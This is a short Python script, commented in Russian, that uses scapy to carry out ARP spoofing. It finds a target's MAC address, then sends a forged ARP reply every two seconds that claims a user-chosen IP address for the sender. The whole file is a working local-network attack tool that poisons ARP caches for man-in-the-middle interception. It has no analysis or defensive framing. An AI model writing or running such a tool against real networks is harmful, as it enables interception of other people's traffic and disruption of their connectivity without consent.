#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys
import colorama

def get_mac(ip):
	'''Send ARP packet to find out mac'''
	arp_req = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')

	global arp_req_broadcast
	arp_req_broadcast = broadcast/arp_req

	answered_list = scapy.srp(arp_req_broadcast , timeout = 1 , verbose = False)[0]

	global mac_addres
	mac_addres = answered_list[0][1].hwsrc


def arp_spoof(ip_send , ip_who):
	'''ARP spoofing'''
	arp = scapy.ARP(op = 2 , pdst = ip_send , hwdst =  mac_addres, psrc = ip_who)

	#pdst - IP целевого ПК (кому)
	#hwdst - MAC field
	#psrc - Источник (откуда) IP

	sent_packet = 0

	while True:
		try:
			scapy.send(arp , verbose = False)

			print(colorama.Fore.GREEN + f'\r [+] Отправлено пакетов: {sent_packet}!' , end = ''),
			sys.stdout.flush()

			sent_packet = sent_packet + 1
			time.sleep(2)

		except KeyboardInterrupt:
			print(colorama.Fore.RED + '\n [*] Процесс остановлен')
			quit()


ip_send_to = str(input('Введите IP (кому будем отправлять):'))
ip_who_to_be = str(input('Введите IP (кем представимся):'))


if __name__ == '__main__':
	try:
		get_mac(ip_send_to)
		arp_spoof(ip_send_to , ip_who_to_be)

	except IndexError as e:
		print(e)
		print(colorama.Fore.RED + '[!] Введён неправильный IP!')
